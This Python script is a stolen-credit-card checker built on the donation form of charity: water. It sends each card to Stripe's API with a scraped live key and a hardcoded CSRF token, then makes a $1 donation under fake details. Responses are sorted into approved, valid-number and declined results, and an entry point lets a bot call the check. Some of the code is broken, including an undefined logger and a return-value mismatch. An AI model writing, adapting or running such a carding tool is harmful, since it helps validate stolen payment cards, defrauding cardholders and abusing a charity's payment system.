import aiohttp
import asyncio
import sys
import json
import re
import time
import requests
import random

DOMAIN = "https://www.charitywater.org"
PK = "pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU"

CCN_patterns = [
    'security code is incorrect',
    'incorrect_cvc',
    'cvc_check_failed',
    'Gateway Rejected: cvv',
    'Card Issuer Declined CVV',
]

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None

async def make_request(session, url, method="POST", headers=None, data=None, timeout=30, retries=3):
    for attempt in range(retries):
        try:
            async with session.request(
                method,
                url,
                headers=headers,
                data=data,
                timeout=aiohttp.ClientTimeout(total=timeout),
                ssl=False
            ) as response:
                text = await response.text()
                return response.status, text
        except Exception:
            if attempt == retries - 1:
                return 0, "Request failed"
            await asyncio.sleep(1)
    return 0, "Max retries exceeded"

async def ppc(card):
    try:
        parts = card.split("|")
        if len(parts) != 4:
            return json.dumps({"error": "Invalid card format"})
        cc, mon, year, cvv = parts
        year = year[-2:] if len(year) == 4 else year

        connector = aiohttp.TCPConnector(limit=10, limit_per_host=5, ttl_dns_cache=300, use_dns_cache=True, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            status1, resp1 = await make_request(
                session,
                url="https://api.stripe.com/v1/payment_methods",
                method="POST",
                headers={
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                    'user-agent': 'Mozilla/5.0',
                },
                data=f'type=card&billing_details[address][city]=New+york&billing_details[address][country]=IN&billing_details[address][line1]=A27+shsh&billing_details[email]=xavhsu27%40gmail.com&billing_details[name]=John+Smith&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mon}&card[exp_year]={year}&key={PK}',
                timeout=30,
                retries=3
            )
            if status1 not in [200, 201]:
                return resp1
            try:
                payment_data = json.loads(resp1)
                pmid = payment_data.get("id")
            except:
                pmid = parseX(resp1, '"id": "', '"')
            if not pmid:
                return json.dumps({"error": "Payment method creation failed"})

            await asyncio.sleep(1)

            status2, resp2 = await make_request(
                session,
                url=f"{DOMAIN}/donate/stripe",
                method="POST",
                headers={
                    'accept': '*/*',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': DOMAIN,
                    'referer': f"{DOMAIN}/",
                    'user-agent': 'Mozilla/5.0',
                    'x-csrf-token': 'G6M57A4FuXbsZPZSEK0MAEXhL_9EluoMxuHDF8qR5JDhDtqmBmygTdfZJX5x2RQg-yCWAn2llWRv4oGe8yu04A',
                    'x-requested-with': 'XMLHttpRequest',
                },
                data={
                    'country': 'us',
                    'payment_intent[email]': 'xavh7272u27@gmail.com',
                    'payment_intent[amount]': '1',
                    'payment_intent[currency]': 'usd',
                    'payment_intent[metadata][donation_kind]': 'water',
                    'payment_intent[payment_method]': pmid,
                    'donation_form[amount]': '1',
                    'donation_form[email]': 'xavh7272u27@gmail.com',
                    'donation_form[name]': 'John',
                    'donation_form[surname]': 'Smith',
                    'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
                    'donation_form[metadata][donation_kind]': 'water',
                    'donation_form[metadata][email_consent_granted]': 'true',
                    'donation_form[address][address_line_1]': 'A27 shsh',
                    'donation_form[address][city]': 'New york',
                    'donation_form[address][country]': 'IN',
                    'donation_form[address][zip]': '10001',
                },
                timeout=45,
                retries=2
            )
            return resp2
    except Exception as e:
        return json.dumps({"error": f"Processing error: {str(e)}"})

def parse_result(result):
    try:
        data = json.loads(result)
        if "error" in data:
            message = data["error"]
            if isinstance(message, dict):
                msg_text = message.get("message", "Unknown error")
                code = message.get("code", "")
            else:
                msg_text = str(message)
                code = ""
            
            # Format the response as "DECLINED|Message, code"
            if code:
                return f"DECLINED|{msg_text}, {code}"
            else:
                return f"DECLINED|{msg_text}"
                
        if data.get("success") or data.get("status") == "succeeded":
            return "APPROVED|Payment successful"
            
        return "DECLINED|Unknown decline reason"
        
    except:
        # If not JSON, check text for CCN or success keywords
        text = result.lower()
        if any(pat in text for pat in CCN_patterns):
            return "CCN|" + result
        if any(word in text for word in ["success", "approved", "completed", "thank you"]):
            return "APPROVED|" + result
        return "DECLINED|" + result

def check(card):
    """
    Synchronous card check using requests.
    Card format: "cc|mm|yy|cvv"
    Returns: "STATUS|Message"
    """
    try:
        parts = card.split("|")
        if len(parts) != 4:
            return "ERROR|Invalid card format"
        cc, mon, year, cvv = parts
        year = year[-2:] if len(year) == 4 else year

        # Step 1: Create payment method (Stripe)
        url1 = "https://api.stripe.com/v1/payment_methods"
        headers1 = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0',
        }
        data1 = {
            'type': 'card',
            'billing_details[address][city]': 'New york',
            'billing_details[address][country]': 'IN',
            'billing_details[address][line1]': 'A27 shsh',
            'billing_details[email]': 'xavhsu27@gmail.com',
            'billing_details[name]': 'John Smith',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mon,
            'card[exp_year]': year,
            'key': PK,
        }
        r1 = requests.post(url1, headers=headers1, data=data1, timeout=30, verify=False)
        if r1.status_code not in [200, 201]:
            # Parse the error response
            try:
                error_data = r1.json()
                error_msg = error_data.get('error', {}).get('message', 'Unknown error')
                error_code = error_data.get('error', {}).get('code', '')
                if error_code:
                    return f"DECLINED|{error_msg}, {error_code}"
                else:
                    return f"DECLINED|{error_msg}"
            except:
                return f"DECLINED|{r1.text}"

        resp1 = r1.json()
        pmid = resp1.get("id")
        if not pmid:
            return "DECLINED|Payment method creation failed"

        # Step 2: Donation request
        url2 = f"{DOMAIN}/donate/stripe"
        headers2 = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': DOMAIN,
            'referer': f"{DOMAIN}/",
            'user-agent': 'Mozilla/5.0',
            'x-csrf-token': 'G6M57A4FuXbsZPZSEK0MAEXhL_9EluoMxuHDF8qR5JDhDtqmBmygTdfZJX5x2RQg-yCWAn2llWRv4oGe8yu04A',
            'x-requested-with': 'XMLHttpRequest',
        }
        data2 = {
            'country': 'us',
            'payment_intent[email]': 'xavh7272u27@gmail.com',
            'payment_intent[amount]': '1',
            'payment_intent[currency]': 'usd',
            'payment_intent[metadata][donation_kind]': 'water',
            'payment_intent[payment_method]': pmid,
            'donation_form[amount]': '1',
            'donation_form[email]': 'xavh7272u27@gmail.com',
            'donation_form[name]': 'John',
            'donation_form[surname]': 'Smith',
            'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
            'donation_form[metadata][donation_kind]': 'water',
            'donation_form[metadata][email_consent_granted]': 'true',
            'donation_form[address][address_line_1]': 'A27 shsh',
            'donation_form[address][city]': 'New york',
            'donation_form[address][country]': 'IN',
            'donation_form[address][zip]': '10001',
        }
        r2 = requests.post(url2, headers=headers2, data=data2, timeout=45, verify=False)
        
        # Parse the response
        try:
            response_data = r2.json()
            if "error" in response_data:
                message = response_data["error"]
                if isinstance(message, dict):
                    msg_text = message.get("message", "Unknown error")
                    code = message.get("code", "")
                else:
                    msg_text = str(message)
                    code = ""
                
                if code:
                    return f"DECLINED|{msg_text}, {code}"
                else:
                    return f"DECLINED|{msg_text}"
                    
            if response_data.get("success") or response_data.get("status") == "succeeded":
                return "APPROVED|Payment successful"
                
            return "DECLINED|Unknown decline reason"
            
        except:
            text = r2.text.lower()
            if any(pat in text for pat in CCN_patterns):
                return "CCN|" + r2.text
            if any(word in text for word in ["success", "approved", "completed", "thank you"]):
                return "APPROVED|" + r2.text
            return "DECLINED|" + r2.text
            
    except Exception as e:
        return f"ERROR|{str(e)}"

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("ERROR|Missing card argument")
        sys.exit(1)
    card = sys.argv[1]
    result = check(card)
    print(result)


async def stripe_check(card: str):
    """Main entry point to check a card from the bot."""
    try:
        result = await ppc(card)
        status, message, raw = parse_result(result)

        # Log in console
        logger.info("[StripeCheck] Card: %s | Status: %s | Message: %s", card, status, message)
        logger.debug("[StripeCheck] Raw: %s", raw)

        return status, message, raw

    except Exception as e:
        logger.error("Stripe check failed for card %s: %s", card, e, exc_info=True)
        return "ERROR", str(e), None
